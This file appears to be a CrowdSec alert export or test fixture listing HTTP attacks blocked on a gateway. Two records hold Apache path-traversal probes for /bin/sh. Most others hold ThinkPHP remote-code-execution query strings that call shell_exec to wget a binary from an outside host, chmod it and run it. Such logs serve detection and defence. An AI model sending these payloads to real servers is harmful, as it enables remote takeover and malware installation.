@@ -1,0 +1,1170 @@
+[
+ {
+  "capacity": 0,
+  "created_at": "2026-10-06T17:35:44Z",
+  "decisions": [
+   {
+    "duration": "3h14m5s",
+    "id": 26841773,
+    "origin": "crowdsec",
+    "scenario": "crowdsecurity/http-cve-2021-42013",
+    "scope": "Ip",
+    "simulated": false,
+    "type": "ban",
+    "value": "203.0.113.1"
+   }
+  ],
+  "events": [
+   {
+    "meta": [
+     {
+      "key": "ASNNumber",
+      "value": "64496"
+     },
+     {
+      "key": "ASNOrg",
+      "value": "EXAMPLE-NET"
+     },
+     {
+      "key": "IsInEU",
+      "value": "false"
+     },
+     {
+      "key": "IsoCode",
+      "value": "HK"
+     },
+     {
+      "key": "SourceRange",
+      "value": "203.0.113.2/23"
+     },
+     {
+      "key": "datasource_path",
+      "value": "/var/log/nginx/access.log"
+     },
+     {
+      "key": "datasource_type",
+      "value": "file"
+     },
+     {
+      "key": "http_args_len",
+      "value": "0"
+     },
+     {
+      "key": "http_path",
+      "value": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
+     },
+     {
+      "key": "http_status",
+      "value": "400"
+     },
+     {
+      "key": "http_user_agent",
+      "value": "-"
+     },
+     {
+      "key": "http_verb",
+      "value": "POST"
+     },
+     {
+      "key": "log_type",
+      "value": "http_access-log"
+     },
+     {
+      "key": "service",
+      "value": "http"
+     },
+     {
+      "key": "source_ip",
+      "value": "203.0.113.1"
+     },
+     {
+      "key": "timestamp",
+      "value": "2026-10-06T19:35:44+02:00"
+     }
+    ],
+    "timestamp": "2026-10-06 19:35:44 +0200 +0200"
+   }
+  ],
+  "events_count": 1,
+  "id": 4443,
+  "kind": "crowdsec",
+  "labels": null,
+  "leakspeed": "0s",
+  "machine_id": "loxprox-gateway",
+  "message": "Ip 203.0.113.1 performed 'crowdsecurity/http-cve-2021-42013' (1 events over 0s) at 2026-10-06 17:35:44.483629905 +0000 UTC",
+  "meta": [
+   {
+    "key": "target_uri",
+    "value": "[\"/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh\"]"
+   },
+   {
+    "key": "method",
+    "value": "[\"POST\"]"
+   },
+   {
+    "key": "user_agent",
+    "value": "[\"-\"]"
+   },
+   {
+    "key": "status",
+    "value": "[\"400\"]"
+   }
+  ],
+  "remediation": true,
+  "scenario": "crowdsecurity/http-cve-2021-42013",
+  "scenario_hash": "b9e598a8e063f525a16ba78488787da5d409141c3a8b2665263654d92745e59a",
+  "scenario_version": "0.3",
+  "simulated": false,
+  "source": {
+   "as_name": "EXAMPLE-NET",
+   "as_number": "64496",
+   "cn": "HK",
+   "ip": "203.0.113.1",
+   "latitude": 0,
+   "longitude": 0,
+   "range": "203.0.113.2/23",
+   "scope": "Ip",
+   "value": "203.0.113.1"
+  },
+  "start_at": "2026-10-06T17:35:44Z",
+  "stop_at": "2026-10-06T17:35:44Z",
+  "uuid": "00000000-0000-4000-8000-000000000000"
+ },
+ {
+  "capacity": 0,
+  "created_at": "2026-10-06T17:35:44Z",
+  "decisions": [],
+  "events": [
+   {
+    "meta": [
+     {
+      "key": "ASNNumber",
+      "value": "64496"
+     },
+     {
+      "key": "ASNOrg",
+      "value": "EXAMPLE-NET"
+     },
+     {
+      "key": "IsInEU",
+      "value": "false"
+     },
+     {
+      "key": "IsoCode",
+      "value": "HK"
+     },
+     {
+      "key": "SourceRange",
+      "value": "203.0.113.2/23"
+     },
+     {
+      "key": "datasource_path",
+      "value": "/var/log/nginx/access.log"
+     },
+     {
+      "key": "datasource_type",
+      "value": "file"
+     },
+     {
+      "key": "http_args_len",
+      "value": "0"
+     },
+     {
+      "key": "http_path",
+      "value": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
+     },
+     {
+      "key": "http_status",
+      "value": "400"
+     },
+     {
+      "key": "http_user_agent",
+      "value": "-"
+     },
+     {
+      "key": "http_verb",
+      "value": "POST"
+     },
+     {
+      "key": "log_type",
+      "value": "http_access-log"
+     },
+     {
+      "key": "service",
+      "value": "http"
+     },
+     {
+      "key": "source_ip",
+      "value": "203.0.113.1"
+     },
+     {
+      "key": "timestamp",
+      "value": "2026-10-06T19:35:43+02:00"
+     }
+    ],
+    "timestamp": "2026-10-06 19:35:43 +0200 +0200"
+   }
+  ],
+  "events_count": 1,
+  "id": 4442,
+  "kind": "crowdsec",
+  "labels": null,
+  "leakspeed": "0s",
+  "machine_id": "loxprox-gateway",
+  "message": "Ip 203.0.113.1 performed 'crowdsecurity/http-cve-2021-41773' (1 events over 0s) at 2026-10-06 17:35:43.66223601 +0000 UTC",
+  "meta": [
+   {
+    "key": "target_uri",
+    "value": "[\"/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh\"]"
+   },
+   {
+    "key": "user_agent",
+    "value": "[\"-\"]"
+   },
+   {
+    "key": "method",
+    "value": "[\"POST\"]"
+   },
+   {
+    "key": "status",
+    "value": "[\"400\"]"
+   }
+  ],
+  "remediation": true,
+  "scenario": "crowdsecurity/http-cve-2021-41773",
+  "scenario_hash": "f3fa755209fab221d6bbe04abd835c6539034cd72521725f960cdb36157e4313",
+  "scenario_version": "0.3",
+  "simulated": false,
+  "source": {
+   "as_name": "EXAMPLE-NET",
+   "as_number": "64496",
+   "cn": "HK",
+   "ip": "203.0.113.1",
+   "latitude": 0,
+   "longitude": 0,
+   "range": "203.0.113.2/23",
+   "scope": "Ip",
+   "value": "203.0.113.1"
+  },
+  "start_at": "2026-10-06T17:35:43Z",
+  "stop_at": "2026-10-06T17:35:43Z",
+  "uuid": "00000000-0000-4000-8000-000000000000"
+ },
+ {
+  "capacity": 0,
+  "created_at": "2026-10-06T17:29:02Z",
+  "decisions": [
+   {
+    "duration": "3h7m23s",
+    "id": 26841771,
+    "origin": "crowdsec",
+    "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+    "scope": "Ip",
+    "simulated": false,
+    "type": "ban",
+    "value": "203.0.113.3"
+   }
+  ],
+  "events": [
+   {
+    "meta": [
+     {
+      "key": "ASNNumber",
+      "value": "64496"
+     },
+     {
+      "key": "ASNOrg",
+      "value": "EXAMPLE-NET"
+     },
+     {
+      "key": "IsInEU",
+      "value": "false"
+     },
+     {
+      "key": "IsoCode",
+      "value": "EG"
+     },
+     {
+      "key": "SourceRange",
+      "value": "203.0.113.4/11"
+     },
+     {
+      "key": "datasource_path",
+      "value": "/var/log/nginx/access.log"
+     },
+     {
+      "key": "datasource_type",
+      "value": "file"
+     },
+     {
+      "key": "http_args_len",
+      "value": "216"
+     },
+     {
+      "key": "http_path",
+      "value": "/index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://203.0.113.5/5r3fqt67ew531has4231.x86; chmod 777 5r3fqt67ew531has4231.x86; ./5r3fqt67ew531has4231.x86'"
+     },
+     {
+      "key": "http_status",
+      "value": "400"
+     },
+     {
+      "key": "http_user_agent",
+      "value": "-"
+     },
+     {
+      "key": "http_verb",
+      "value": "GET"
+     },
+     {
+      "key": "log_type",
+      "value": "http_access-log"
+     },
+     {
+      "key": "service",
+      "value": "http"
+     },
+     {
+      "key": "source_ip",
+      "value": "203.0.113.3"
+     },
+     {
+      "key": "timestamp",
+      "value": "2026-10-06T19:29:02+02:00"
+     }
+    ],
+    "timestamp": "2026-10-06 19:29:02 +0200 +0200"
+   }
+  ],
+  "events_count": 1,
+  "id": 4441,
+  "kind": "crowdsec",
+  "labels": null,
+  "leakspeed": "0s",
+  "machine_id": "loxprox-gateway",
+  "message": "Ip 203.0.113.3 performed 'crowdsecurity/thinkphp-cve-2018-20062' (1 events over 0s) at 2026-10-06 17:29:02.258470174 +0000 UTC",
+  "meta": [
+   {
+    "key": "status",
+    "value": "[\"400\"]"
+   },
+   {
+    "key": "method",
+    "value": "[\"GET\"]"
+   },
+   {
+    "key": "target_uri",
+    "value": "[\"/index.php?s=/index/\\\\x09hink\\\\x07pp/invokefunction\\u0026function=call_user_func_array\\u0026vars[0]=shell_exec\\u0026vars[1][]= 'wget http://203.0.113.5/5r3fqt67ew531has4231.x86; chmod 777 5r3fqt67ew531has4231.x86; ./5r3fqt67ew531has4231.x86'\"]"
+   },
+   {
+    "key": "user_agent",
+    "value": "[\"-\"]"
+   }
+  ],
+  "remediation": true,
+  "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+  "scenario_hash": "6e1b99fbbced78290de19222c5f793aa40980130b32a5a5f2738195d71cce779",
+  "scenario_version": "0.7",
+  "simulated": false,
+  "source": {
+   "as_name": "EXAMPLE-NET",
+   "as_number": "64496",
+   "cn": "EG",
+   "ip": "203.0.113.3",
+   "latitude": 0,
+   "longitude": 0,
+   "range": "203.0.113.4/11",
+   "scope": "Ip",
+   "value": "203.0.113.3"
+  },
+  "start_at": "2026-10-06T17:29:02Z",
+  "stop_at": "2026-10-06T17:29:02Z",
+  "uuid": "00000000-0000-4000-8000-000000000000"
+ },
+ {
+  "capacity": 0,
+  "created_at": "2026-10-06T16:23:00Z",
+  "decisions": [
+   {
+    "duration": "2h1m20s",
+    "id": 26841770,
+    "origin": "crowdsec",
+    "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+    "scope": "Ip",
+    "simulated": false,
+    "type": "ban",
+    "value": "203.0.113.6"
+   }
+  ],
+  "events": [
+   {
+    "meta": [
+     {
+      "key": "ASNNumber",
+      "value": "64496"
+     },
+     {
+      "key": "ASNOrg",
+      "value": "EXAMPLE-NET"
+     },
+     {
+      "key": "IsInEU",
+      "value": "false"
+     },
+     {
+      "key": "IsoCode",
+      "value": "ET"
+     },
+     {
+      "key": "SourceRange",
+      "value": "203.0.113.7/14"
+     },
+     {
+      "key": "datasource_path",
+      "value": "/var/log/nginx/access.log"
+     },
+     {
+      "key": "datasource_type",
+      "value": "file"
+     },
+     {
+      "key": "http_args_len",
+      "value": "190"
+     },
+     {
+      "key": "http_path",
+      "value": "/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://203.0.113.8/mips -O /tmp/.t; chmod 777 /tmp/.t; /tmp/.t selfrep.thinkphp'"
+     },
+     {
+      "key": "http_status",
+      "value": "400"
+     },
+     {
+      "key": "http_user_agent",
+      "value": "-"
+     },
+     {
+      "key": "http_verb",
+      "value": "GET"
+     },
+     {
+      "key": "log_type",
+      "value": "http_access-log"
+     },
+     {
+      "key": "service",
+      "value": "http"
+     },
+     {
+      "key": "source_ip",
+      "value": "203.0.113.6"
+     },
+     {
+      "key": "timestamp",
+      "value": "2026-10-06T18:22:59+02:00"
+     }
+    ],
+    "timestamp": "2026-10-06 18:22:59 +0200 +0200"
+   }
+  ],
+  "events_count": 1,
+  "id": 4440,
+  "kind": "crowdsec",
+  "labels": null,
+  "leakspeed": "0s",
+  "machine_id": "loxprox-gateway",
+  "message": "Ip 203.0.113.6 performed 'crowdsecurity/thinkphp-cve-2018-20062' (1 events over 0s) at 2026-10-06 16:22:59.969955387 +0000 UTC",
+  "meta": [
+   {
+    "key": "user_agent",
+    "value": "[\"-\"]"
+   },
+   {
+    "key": "status",
+    "value": "[\"400\"]"
+   },
+   {
+    "key": "method",
+    "value": "[\"GET\"]"
+   },
+   {
+    "key": "target_uri",
+    "value": "[\"/index.php?s=/index/\\\\x5Cthink\\\\x5Capp/invokefunction\\u0026function=call_user_func_array\\u0026vars[0]=shell_exec\\u0026vars[1][]= 'wget http://203.0.113.8/mips -O /tmp/.t; chmod 777 /tmp/.t; /tmp/.t selfrep.thinkphp'\"]"
+   }
+  ],
+  "remediation": true,
+  "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+  "scenario_hash": "6e1b99fbbced78290de19222c5f793aa40980130b32a5a5f2738195d71cce779",
+  "scenario_version": "0.7",
+  "simulated": false,
+  "source": {
+   "as_name": "EXAMPLE-NET",
+   "as_number": "64496",
+   "cn": "ET",
+   "ip": "203.0.113.6",
+   "latitude": 0,
+   "longitude": 0,
+   "range": "203.0.113.7/14",
+   "scope": "Ip",
+   "value": "203.0.113.6"
+  },
+  "start_at": "2026-10-06T16:22:59Z",
+  "stop_at": "2026-10-06T16:22:59Z",
+  "uuid": "00000000-0000-4000-8000-000000000000"
+ },
+ {
+  "capacity": 0,
+  "created_at": "2026-10-06T15:56:49Z",
+  "decisions": [
+   {
+    "duration": "1h35m10s",
+    "id": 26841769,
+    "origin": "crowdsec",
+    "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+    "scope": "Ip",
+    "simulated": false,
+    "type": "ban",
+    "value": "203.0.113.9"
+   }
+  ],
+  "events": [
+   {
+    "meta": [
+     {
+      "key": "ASNNumber",
+      "value": "64496"
+     },
+     {
+      "key": "ASNOrg",
+      "value": "EXAMPLE-NET"
+     },
+     {
+      "key": "IsInEU",
+      "value": "false"
+     },
+     {
+      "key": "IsoCode",
+      "value": "EG"
+     },
+     {
+      "key": "SourceRange",
+      "value": "203.0.113.10/11"
+     },
+     {
+      "key": "datasource_path",
+      "value": "/var/log/nginx/access.log"
+     },
+     {
+      "key": "datasource_type",
+      "value": "file"
+     },
+     {
+      "key": "http_args_len",
+      "value": "216"
+     },
+     {
+      "key": "http_path",
+      "value": "/index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://203.0.113.5/5r3fqt67ew531has4231.x86; chmod 777 5r3fqt67ew531has4231.x86; ./5r3fqt67ew531has4231.x86'"
+     },
+     {
+      "key": "http_status",
+      "value": "400"
+     },
+     {
+      "key": "http_user_agent",
+      "value": "-"
+     },
+     {
+      "key": "http_verb",
+      "value": "GET"
+     },
+     {
+      "key": "log_type",
+      "value": "http_access-log"
+     },
+     {
+      "key": "service",
+      "value": "http"
+     },
+     {
+      "key": "source_ip",
+      "value": "203.0.113.9"
+     },
+     {
+      "key": "timestamp",
+      "value": "2026-10-06T17:56:49+02:00"
+     }
+    ],
+    "timestamp": "2026-10-06 17:56:49 +0200 +0200"
+   }
+  ],
+  "events_count": 1,
+  "id": 4439,
+  "kind": "crowdsec",
+  "labels": null,
+  "leakspeed": "0s",
+  "machine_id": "loxprox-gateway",
+  "message": "Ip 203.0.113.9 performed 'crowdsecurity/thinkphp-cve-2018-20062' (1 events over 0s) at 2026-10-06 15:56:49.182427215 +0000 UTC",
+  "meta": [
+   {
+    "key": "target_uri",
+    "value": "[\"/index.php?s=/index/\\\\x09hink\\\\x07pp/invokefunction\\u0026function=call_user_func_array\\u0026vars[0]=shell_exec\\u0026vars[1][]= 'wget http://203.0.113.5/5r3fqt67ew531has4231.x86; chmod 777 5r3fqt67ew531has4231.x86; ./5r3fqt67ew531has4231.x86'\"]"
+   },
+   {
+    "key": "user_agent",
+    "value": "[\"-\"]"
+   },
+   {
+    "key": "status",
+    "value": "[\"400\"]"
+   },
+   {
+    "key": "method",
+    "value": "[\"GET\"]"
+   }
+  ],
+  "remediation": true,
+  "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+  "scenario_hash": "6e1b99fbbced78290de19222c5f793aa40980130b32a5a5f2738195d71cce779",
+  "scenario_version": "0.7",
+  "simulated": false,
+  "source": {
+   "as_name": "EXAMPLE-NET",
+   "as_number": "64496",
+   "cn": "EG",
+   "ip": "203.0.113.9",
+   "latitude": 0,
+   "longitude": 0,
+   "range": "203.0.113.10/11",
+   "scope": "Ip",
+   "value": "203.0.113.9"
+  },
+  "start_at": "2026-10-06T15:56:49Z",
+  "stop_at": "2026-10-06T15:56:49Z",
+  "uuid": "00000000-0000-4000-8000-000000000000"
+ },
+ {
+  "capacity": 0,
+  "created_at": "2026-10-06T15:54:58Z",
+  "decisions": [
+   {
+    "duration": "1h33m19s",
+    "id": 26841768,
+    "origin": "crowdsec",
+    "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+    "scope": "Ip",
+    "simulated": false,
+    "type": "ban",
+    "value": "203.0.113.11"
+   }
+  ],
+  "events": [
+   {
+    "meta": [
+     {
+      "key": "ASNNumber",
+      "value": "64496"
+     },
+     {
+      "key": "ASNOrg",
+      "value": "EXAMPLE-NET"
+     },
+     {
+      "key": "IsInEU",
+      "value": "false"
+     },
+     {
+      "key": "IsoCode",
+      "value": "EG"
+     },
+     {
+      "key": "SourceRange",
+      "value": "203.0.113.12/12"
+     },
+     {
+      "key": "datasource_path",
+      "value": "/var/log/nginx/access.log"
+     },
+     {
+      "key": "datasource_type",
+      "value": "file"
+     },
+     {
+      "key": "http_args_len",
+      "value": "216"
+     },
+     {
+      "key": "http_path",
+      "value": "/index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://203.0.113.5/5r3fqt67ew531has4231.x86; chmod 777 5r3fqt67ew531has4231.x86; ./5r3fqt67ew531has4231.x86'"
+     },
+     {
+      "key": "http_status",
+      "value": "400"
+     },
+     {
+      "key": "http_user_agent",
+      "value": "-"
+     },
+     {
+      "key": "http_verb",
+      "value": "GET"
+     },
+     {
+      "key": "log_type",
+      "value": "http_access-log"
+     },
+     {
+      "key": "service",
+      "value": "http"
+     },
+     {
+      "key": "source_ip",
+      "value": "203.0.113.11"
+     },
+     {
+      "key": "timestamp",
+      "value": "2026-10-06T17:54:58+02:00"
+     }
+    ],
+    "timestamp": "2026-10-06 17:54:58 +0200 +0200"
+   }
+  ],
+  "events_count": 1,
+  "id": 4438,
+  "kind": "crowdsec",
+  "labels": null,
+  "leakspeed": "0s",
+  "machine_id": "loxprox-gateway",
+  "message": "Ip 203.0.113.11 performed 'crowdsecurity/thinkphp-cve-2018-20062' (1 events over 0s) at 2026-10-06 15:54:58.146531243 +0000 UTC",
+  "meta": [
+   {
+    "key": "method",
+    "value": "[\"GET\"]"
+   },
+   {
+    "key": "status",
+    "value": "[\"400\"]"
+   },
+   {
+    "key": "target_uri",
+    "value": "[\"/index.php?s=/index/\\\\x09hink\\\\x07pp/invokefunction\\u0026function=call_user_func_array\\u0026vars[0]=shell_exec\\u0026vars[1][]= 'wget http://203.0.113.5/5r3fqt67ew531has4231.x86; chmod 777 5r3fqt67ew531has4231.x86; ./5r3fqt67ew531has4231.x86'\"]"
+   },
+   {
+    "key": "user_agent",
+    "value": "[\"-\"]"
+   }
+  ],
+  "remediation": true,
+  "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+  "scenario_hash": "6e1b99fbbced78290de19222c5f793aa40980130b32a5a5f2738195d71cce779",
+  "scenario_version": "0.7",
+  "simulated": false,
+  "source": {
+   "as_name": "EXAMPLE-NET",
+   "as_number": "64496",
+   "cn": "EG",
+   "ip": "203.0.113.11",
+   "latitude": 0,
+   "longitude": 0,
+   "range": "203.0.113.12/12",
+   "scope": "Ip",
+   "value": "203.0.113.11"
+  },
+  "start_at": "2026-10-06T15:54:58Z",
+  "stop_at": "2026-10-06T15:54:58Z",
+  "uuid": "00000000-0000-4000-8000-000000000000"
+ },
+ {
+  "capacity": 0,
+  "created_at": "2026-10-06T15:40:56Z",
+  "decisions": [
+   {
+    "duration": "1h19m17s",
+    "id": 26841767,
+    "origin": "crowdsec",
+    "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+    "scope": "Ip",
+    "simulated": false,
+    "type": "ban",
+    "value": "203.0.113.13"
+   }
+  ],
+  "events": [
+   {
+    "meta": [
+     {
+      "key": "ASNNumber",
+      "value": "64496"
+     },
+     {
+      "key": "ASNOrg",
+      "value": "EXAMPLE-NET"
+     },
+     {
+      "key": "IsInEU",
+      "value": "false"
+     },
+     {
+      "key": "IsoCode",
+      "value": "EG"
+     },
+     {
+      "key": "SourceRange",
+      "value": "203.0.113.4/11"
+     },
+     {
+      "key": "datasource_path",
+      "value": "/var/log/nginx/access.log"
+     },
+     {
+      "key": "datasource_type",
+      "value": "file"
+     },
+     {
+      "key": "http_args_len",
+      "value": "216"
+     },
+     {
+      "key": "http_path",
+      "value": "/index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://203.0.113.5/5r3fqt67ew531has4231.x86; chmod 777 5r3fqt67ew531has4231.x86; ./5r3fqt67ew531has4231.x86'"
+     },
+     {
+      "key": "http_status",
+      "value": "400"
+     },
+     {
+      "key": "http_user_agent",
+      "value": "-"
+     },
+     {
+      "key": "http_verb",
+      "value": "GET"
+     },
+     {
+      "key": "log_type",
+      "value": "http_access-log"
+     },
+     {
+      "key": "service",
+      "value": "http"
+     },
+     {
+      "key": "source_ip",
+      "value": "203.0.113.13"
+     },
+     {
+      "key": "timestamp",
+      "value": "2026-10-06T17:40:56+02:00"
+     }
+    ],
+    "timestamp": "2026-10-06 17:40:56 +0200 +0200"
+   }
+  ],
+  "events_count": 1,
+  "id": 4437,
+  "kind": "crowdsec",
+  "labels": null,
+  "leakspeed": "0s",
+  "machine_id": "loxprox-gateway",
+  "message": "Ip 203.0.113.13 performed 'crowdsecurity/thinkphp-cve-2018-20062' (1 events over 0s) at 2026-10-06 15:40:56.162093817 +0000 UTC",
+  "meta": [
+   {
+    "key": "status",
+    "value": "[\"400\"]"
+   },
+   {
+    "key": "target_uri",
+    "value": "[\"/index.php?s=/index/\\\\x09hink\\\\x07pp/invokefunction\\u0026function=call_user_func_array\\u0026vars[0]=shell_exec\\u0026vars[1][]= 'wget http://203.0.113.5/5r3fqt67ew531has4231.x86; chmod 777 5r3fqt67ew531has4231.x86; ./5r3fqt67ew531has4231.x86'\"]"
+   },
+   {
+    "key": "user_agent",
+    "value": "[\"-\"]"
+   },
+   {
+    "key": "method",
+    "value": "[\"GET\"]"
+   }
+  ],
+  "remediation": true,
+  "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+  "scenario_hash": "6e1b99fbbced78290de19222c5f793aa40980130b32a5a5f2738195d71cce779",
+  "scenario_version": "0.7",
+  "simulated": false,
+  "source": {
+   "as_name": "EXAMPLE-NET",
+   "as_number": "64496",
+   "cn": "EG",
+   "ip": "203.0.113.13",
+   "latitude": 0,
+   "longitude": 0,
+   "range": "203.0.113.4/11",
+   "scope": "Ip",
+   "value": "203.0.113.13"
+  },
+  "start_at": "2026-10-06T15:40:56Z",
+  "stop_at": "2026-10-06T15:40:56Z",
+  "uuid": "00000000-0000-4000-8000-000000000000"
+ },
+ {
+  "capacity": 0,
+  "created_at": "2026-10-06T14:52:44Z",
+  "decisions": [
+   {
+    "duration": "31m5s",
+    "id": 26826766,
+    "origin": "crowdsec",
+    "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+    "scope": "Ip",
+    "simulated": false,
+    "type": "ban",
+    "value": "203.0.113.14"
+   }
+  ],
+  "events": [
+   {
+    "meta": [
+     {
+      "key": "ASNNumber",
+      "value": "64496"
+     },
+     {
+      "key": "ASNOrg",
+      "value": "EXAMPLE-NET"
+     },
+     {
+      "key": "IsInEU",
+      "value": "false"
+     },
+     {
+      "key": "IsoCode",
+      "value": "EG"
+     },
+     {
+      "key": "SourceRange",
+      "value": "203.0.113.12/12"
+     },
+     {
+      "key": "datasource_path",
+      "value": "/var/log/nginx/access.log"
+     },
+     {
+      "key": "datasource_type",
+      "value": "file"
+     },
+     {
+      "key": "http_args_len",
+      "value": "216"
+     },
+     {
+      "key": "http_path",
+      "value": "/index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://203.0.113.5/5r3fqt67ew531has4231.x86; chmod 777 5r3fqt67ew531has4231.x86; ./5r3fqt67ew531has4231.x86'"
+     },
+     {
+      "key": "http_status",
+      "value": "400"
+     },
+     {
+      "key": "http_user_agent",
+      "value": "-"
+     },
+     {
+      "key": "http_verb",
+      "value": "GET"
+     },
+     {
+      "key": "log_type",
+      "value": "http_access-log"
+     },
+     {
+      "key": "service",
+      "value": "http"
+     },
+     {
+      "key": "source_ip",
+      "value": "203.0.113.14"
+     },
+     {
+      "key": "timestamp",
+      "value": "2026-10-06T16:52:44+02:00"
+     }
+    ],
+    "timestamp": "2026-10-06 16:52:44 +0200 +0200"
+   }
+  ],
+  "events_count": 1,
+  "id": 4435,
+  "kind": "crowdsec",
+  "labels": null,
+  "leakspeed": "0s",
+  "machine_id": "loxprox-gateway",
+  "message": "Ip 203.0.113.14 performed 'crowdsecurity/thinkphp-cve-2018-20062' (1 events over 0s) at 2026-10-06 14:52:44.197712622 +0000 UTC",
+  "meta": [
+   {
+    "key": "method",
+    "value": "[\"GET\"]"
+   },
+   {
+    "key": "target_uri",
+    "value": "[\"/index.php?s=/index/\\\\x09hink\\\\x07pp/invokefunction\\u0026function=call_user_func_array\\u0026vars[0]=shell_exec\\u0026vars[1][]= 'wget http://203.0.113.5/5r3fqt67ew531has4231.x86; chmod 777 5r3fqt67ew531has4231.x86; ./5r3fqt67ew531has4231.x86'\"]"
+   },
+   {
+    "key": "user_agent",
+    "value": "[\"-\"]"
+   },
+   {
+    "key": "status",
+    "value": "[\"400\"]"
+   }
+  ],
+  "remediation": true,
+  "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+  "scenario_hash": "6e1b99fbbced78290de19222c5f793aa40980130b32a5a5f2738195d71cce779",
+  "scenario_version": "0.7",
+  "simulated": false,
+  "source": {
+   "as_name": "EXAMPLE-NET",
+   "as_number": "64496",
+   "cn": "EG",
+   "ip": "203.0.113.14",
+   "latitude": 0,
+   "longitude": 0,
+   "range": "203.0.113.12/12",
+   "scope": "Ip",
+   "value": "203.0.113.14"
+  },
+  "start_at": "2026-10-06T14:52:44Z",
+  "stop_at": "2026-10-06T14:52:44Z",
+  "uuid": "00000000-0000-4000-8000-000000000000"
+ },
+ {
+  "capacity": 0,
+  "created_at": "2026-10-06T14:30:28Z",
+  "decisions": [
+   {
+    "duration": "8m49s",
+    "id": 26826765,
+    "origin": "crowdsec",
+    "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+    "scope": "Ip",
+    "simulated": false,
+    "type": "ban",
+    "value": "203.0.113.15"
+   }
+  ],
+  "events": [
+   {
+    "meta": [
+     {
+      "key": "ASNNumber",
+      "value": "64496"
+     },
+     {
+      "key": "ASNOrg",
+      "value": "EXAMPLE-NET"
+     },
+     {
+      "key": "IsInEU",
+      "value": "false"
+     },
+     {
+      "key": "IsoCode",
+      "value": "EG"
+     },
+     {
+      "key": "SourceRange",
+      "value": "203.0.113.10/11"
+     },
+     {
+      "key": "datasource_path",
+      "value": "/var/log/nginx/access.log"
+     },
+     {
+      "key": "datasource_type",
+      "value": "file"
+     },
+     {
+      "key": "http_args_len",
+      "value": "216"
+     },
+     {
+      "key": "http_path",
+      "value": "/index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://203.0.113.5/5r3fqt67ew531has4231.x86; chmod 777 5r3fqt67ew531has4231.x86; ./5r3fqt67ew531has4231.x86'"
+     },
+     {
+      "key": "http_status",
+      "value": "400"
+     },
+     {
+      "key": "http_user_agent",
+      "value": "-"
+     },
+     {
+      "key": "http_verb",
+      "value": "GET"
+     },
+     {
+      "key": "log_type",
+      "value": "http_access-log"
+     },
+     {
+      "key": "service",
+      "value": "http"
+     },
+     {
+      "key": "source_ip",
+      "value": "203.0.113.15"
+     },
+     {
+      "key": "timestamp",
+      "value": "2026-10-06T16:30:28+02:00"
+     }
+    ],
+    "timestamp": "2026-10-06 16:30:28 +0200 +0200"
+   }
+  ],
+  "events_count": 1,
+  "id": 4434,
+  "kind": "crowdsec",
+  "labels": null,
+  "leakspeed": "0s",
+  "machine_id": "loxprox-gateway",
+  "message": "Ip 203.0.113.15 performed 'crowdsecurity/thinkphp-cve-2018-20062' (1 events over 0s) at 2026-10-06 14:30:28.53296729 +0000 UTC",
+  "meta": [
+   {
+    "key": "status",
+    "value": "[\"400\"]"
+   },
+   {
+    "key": "method",
+    "value": "[\"GET\"]"
+   },
+   {
+    "key": "user_agent",
+    "value": "[\"-\"]"
+   },
+   {
+    "key": "target_uri",
+    "value": "[\"/index.php?s=/index/\\\\x09hink\\\\x07pp/invokefunction\\u0026function=call_user_func_array\\u0026vars[0]=shell_exec\\u0026vars[1][]= 'wget http://203.0.113.5/5r3fqt67ew531has4231.x86; chmod 777 5r3fqt67ew531has4231.x86; ./5r3fqt67ew531has4231.x86'\"]"
+   }
+  ],
+  "remediation": true,
+  "scenario": "crowdsecurity/thinkphp-cve-2018-20062",
+  "scenario_hash": "6e1b99fbbced78290de19222c5f793aa40980130b32a5a5f2738195d71cce779",
+  "scenario_version": "0.7",
+  "simulated": false,
+  "source": {
+   "as_name": "EXAMPLE-NET",
+   "as_number": "64496",
+   "cn": "EG",
+   "ip": "203.0.113.15",
+   "latitude": 0,
+   "longitude": 0,
+   "range": "203.0.113.10/11",
+   "scope": "Ip",
+   "value": "203.0.113.15"
+  },
+  "start_at": "2026-10-06T14:30:28Z",
+  "stop_at": "2026-10-06T14:30:28Z",
+  "uuid": "00000000-0000-4000-8000-000000000000"
+ }
+]
